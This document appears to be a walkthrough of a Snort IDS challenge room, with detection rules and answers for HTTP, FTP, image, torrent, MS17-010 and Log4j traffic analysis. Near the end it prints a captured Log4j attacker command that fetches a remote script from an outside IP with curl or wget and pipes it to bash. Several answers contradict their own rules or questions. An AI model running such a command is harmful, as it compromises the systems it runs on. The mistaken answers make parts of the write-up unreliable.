# Snort Challenge Room 

## Room Description
The room invites you a challenge to investigate a series of traffic data and stop malicious activity under two different scenarios. Let's start working with Snort to analyse live and captured traffic.

## Writing IDS IPS Rules for Detection

We are going to configure HTTP rules which can be used so that we can filter them using snort. 

The task file mentioned is **TASK-2 (HTTP)**

**HTTP** is the primary plain-text web application protocol. Monitoring Port 80 helps detect **web-based attacks** (such as SQL injections, cross-site scripting, and unauthorized clear-text web communication), web shells, and data exfiltration.

### Challenges 1: HTTP Request Monitoring and Detection  

**Question** 1:  Navigate to the task folder and use the given pcap file, Write a rule to detect all TCP packets from or to port 80. What is the number of detected packets you got? Note: It should be for both inbound and outbound connections

**Answer:** 

For this particular scenario I will be ediiting the local rules present in the /etc/snort/rules/local.rules

```
snort -c local.rules -r torrent.pcap -l . -A console 
```

![alt text](image.png)

**Rule Used:** Rule Used: alert tcp any any <> any 80 (msg: "TCP Packet Capture"; sid: 1000002; rev:4;)


I want to mention one thing, kindly kindly comment out the existing rules in the /etc/snort/rules/localrules or else the number of alerts like how I made the silly mistake makes you wonder what is the right answer. For which I will show the comparision


**Wrong Answer or Detection**

![alt text](image-2.png)


**Right Answer**
![alt text](image-1.png)

Lets now run snort and we will get the results: 
```
# This helps us to print the output in this particular directory and no need to navigate to some other directory

sudo snort -c /etc/snort/rules/local.rules -r mx-3.pcap -l . -A console
```
**Question** 2: What is the destination address of the 64th packet

**Answer:** 216.239.59.99
```
sudo snort -r snort.log.1792238124 -n 64
```

**Question** 3: Investigate the snort.log file. What is the ACK number of packet 64?

**Answer** 0x2E6B5384

![alt text](image-3.png)

**Question** 4: Investigate the snort.log file. What is the SEQ number of packet 62?

**Answer** Now instead of entering 64 enter 62 so that you do not need to scroll or just scroll and type the right number...choice is yours

**Question** 5: Investigate and tell the TTL for the packet number 65

**Answer** 128



**Question** 6: Source IP for Packet number 65

**Answer** 145.254.160.237

![alt text](image-4.png)

## Writing FTP Rules for Detection

We are going to be configuring FTP rules so that we can detect, and capture the FTP signatures which is monitored, detected and captured.

 File Transfer Protocol (FTP) operates largely in cleartext and is a common target for brute-force attacks, unauthorized file uploads/downloads, and credential harvesting

### Challenge 2: FTP Protocol Monitoring and Detection

**Question** 1: Use the given pcap file. Write a single rule to detect "all TCP port 21"  traffic in the given pcap. What is the number of detected packets? (Navigate to the FTP TASK Folder for the Pcap)

**Answer** 307

![alt text](image-5.png)

**Question** 2: Investigate the log file. What is the FTP service name?

**Answer** The best way to investigate the file is to use wireshark but sadly there ain't wireshark so we gotta use the snort log file itself

```
sudo snort -X -d -e -r snort.log.1792239384 -n 10

```
I just tried to dump it all for the first 10 packets and found the result eventually.

![alt text](image-6.png)

**Question** 3: Clear the previous log and alarm files. Deactivate/comment on the old rules. Write a rule to detect failed FTP login attempts in the given pcap. What is the number of detected packets?

**Answer** Failed Login attempts via FTP is given as 530

so snort rule gets modifed like that: 

alert tcp any any <> any 21 (msg: "Traffic Activity with failed port 21 attempts"; content: "530"; sid: 1000001; rev:1;)


![alt text](image-7.png)

**Question** 4: Clear the previous log and alarm files.Deactivate/comment on the old rule.Write a rule to detect successful FTP logins in the given pcap. What is the number of detected packets?

**Answer:** Successfull attempts would be considered as 230

alert tcp any any <> any 21 (msg: "Traffic Activity with successfull port 21 Login"; content: "230"; sid: 1000001; rev:1;)

![alt text](image-8.png)

**Question** 5: Clear the previous log and alarm files. Deactivate/comment on the old rule.Write a rule to detect FTP login attempts with a valid username but no password entered yet. What is the number of detected packets?

**Answer** Code for correct username but need password for entering means username entered is valid: 230

**Rule:** alert tcp any any <> any 21 (msg: "Username Entered Correct"; content: "331"; sid: 1000001; rev:1;)

![alt text](image-9.png)

**Question** 5: Clear the previous log and alarm files. Deactivate/comment on the old rule. Write a rule to detect FTP login attempts with the "Administrator" username but no password entered yet. What is the number of detected packets?

**Answer:**

**Rule:** alert tcp any any <> any 21 (msg: "Username Entered as Administrator"; content: "331"; sid: 1000001; rev:1;)

To use an and condition add all the content you require in the same rule itself 

![alt text](image-10.png)

## Writing rules for Image File Detection

We are going to be configurings so that we are able to detect malaicious/suspicious img files being sent over the network.

Attackers frequently attempt to smuggle or hide executables, malware, or steganographic payloads inside image files to bypass basic network filters. It is mostly found in those distinct hexadecimal magic number/file signature of PNG files.

### Challenge 3: IMG File Monitoring and Detection 

**Question** 1: Deactivate/comment on the old rule. Write a rule to detect the PNG file in the given pcap.Investigate the logs and identify the software used.

**Answer:** Adobe ImageReady

**Rule Used:** alert tcp any any <> any any (msg: "GIF File Found"; content: "gif"; nocase; sid: 1000001; rev:1;)

![alt text](image-11.png)

**Question** 2: Deactivate/comment on the old rule. Write a rule to detect the GIF file in the given pcap.Investigate the logs and identify the image format embedded in the packet.

**Answer:** GIF89a

![alt text](image-14.png)


![alt text](image-13.png)


![alt text](image-12.png)

## Writing Rules for Torrent Meta Data File Analysis

We are going to be configuring rules so we can monitor, detect, and use torrent meta data file for analysis.

BitTorrent and P2P traffic can **violate corporate acceptable-use policies**, consume massive network bandwidth, and serve as vectors for malware distribution or illegal data sharing.

### Challenge 4 : Torrent Meta Data File Monitoring and Detection



**Question** 1: Write a rule to detect the torrent metafile in the given pcap.  What is the number of detected packets?


**Answer:** 2

**Rule:** alert tcp any any <> any any (msg: "Torrent Meta Data File Found"; content: "torrent"; sid: 1000001; rev:1;)

![alt text](image-15.png)

**Question** 2: What is the name of the torrent application?

**Answer:** bittorrent

```
snort -X -d -e r <filename>

```

**Question** 3: What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?

**Answer:** Application/x-bittorrent

**Question** 4: What is the hostname of the torrent metafile?

**Answer:** tracker2.torrentbox.com


![alt text](image-16.png)

## Troubleshooting Rules

Troubleshoot and fine tuning the rule to view, monitor and detect traffic over the network is crucial and hence Troubleshooting becomes an essential way to notice what misconfiguration is taking place. 

### Challenge 5 : Troubleshooting Snort Rules for Monitoring and Detection

**Question** 1: Fix the syntax error in local-1.rules file and make it work smoothly. What is the number of the detected packets?

![alt text](image-20.png)

**Question** 2: Fix the syntax error in local-2.rules file and make it work smoothly. What is the number of the detected packets?

![alt text](image-19.png)

**Question** 3: Fix the syntax error in local-3.rules file and make it work smoothly. What is the number of the detected packets?

![alt text](image-18.png)


**Question** 4: Fix the syntax error in local-4.rules file and make it work smoothly. What is the number of the detected packets?

![alt text](image-17.png)

**Question** 5: Fix the syntax error in local-5.rules file and make it work smoothly. What is the number of the detected packets?

![alt text](image-21.png)

**Question** 7: Fix the logical error in local-6.rules file and make it work smoothly to create alerts. What is the number of the detected packets?

![alt text](image-23.png)

**Question** 7: Fix the logical error in local-7.rules file and make it work smoothly to create alerts. What is the name of the required option

![alt text](image-22.png)

## Using External Rules


**External or community-supplied rulesets** (such as rules for EternalBlue/MS17-010) address critical, high-severity vulnerabilities (CVSS 9.3+) that allow remote code execution or lateral movement across a network

### Challenge 6 : External Rules for Monitoring and Detection

**Question** 1: Use the given rule file (local.rules) to investigate the ms1710 exploitation. What is the number of detected packets?

**Answer** 25154

![alt text](image-24.png)

**Question** 2: Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword. What is the number of detected packets?

**Answer:** 12

![alt text](image-26.png)

**Question** 3: Investigate the log/alarm files. What is the requested path?

**Answer:** \\192.168.116.138\IPC$

![alt text](image-25.png)


**Question** 4: What is the CVSS v2 score of the MS17-010 vulnerability?

**Answer:** 9.3

## Using External for log4j

The Log4j vulnerability (Log4Shell, CVE-2021-44228) is a critical remote code execution flaw (CVSS 9.3) that lets unauthenticated attackers run arbitrary code via JNDI lookups.

### Challenge 7 : Log4j Analysis for Monitoring and Analysis

**Question** 1: Use the given rule file (local.rules) to investigate the log4j exploitation. What is the number of detected packets?

**Answer:** 26

![alt text](image-27.png)

**Question** 2: Investigate the log/alarm files. How many rules were triggered?.

**Answer:** 4

![alt text](image-28.png)

**Question** 3: Investigate the log/alarm files. What are the first six digits of the triggered rule sids?

**Answer:** 4

**Question** 4: Clear the previous log and alarm files. Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes. What is the number of detected packets?

**Answer:** 41

![alt text](image-29.png)


![alt text](image-31.png)


**Question** 5: What is the encoding format?

**Answer:** Base64

![alt text](image-30.png)


**Question** 6: What is the id of the packet

**Answer:** 21003728

**Question** 7: What is the Attackers command?

**Answer:** (curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash

![alt text](image-34.png)

![alt text](image-33.png)


**Question** 8: Log4j CVSS Vulnerability

**Answer** 9.3

![alt text](image-32.png)